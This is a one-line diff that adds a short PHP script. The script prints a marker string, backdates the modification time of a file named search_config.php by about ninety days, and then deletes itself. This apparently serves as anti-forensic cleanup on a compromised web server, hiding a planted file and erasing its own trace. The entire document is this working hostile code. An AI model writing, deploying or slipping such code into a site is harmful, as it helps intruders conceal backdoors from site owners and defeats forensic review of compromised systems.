@@ -1,0 +1,1 @@
+<?php echo "SbAKxpksph"; if (file_exists("./search_config.php")){ touch("./search_config.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*tsW7SEKtfxwXQZAGxhqU*/ ?>
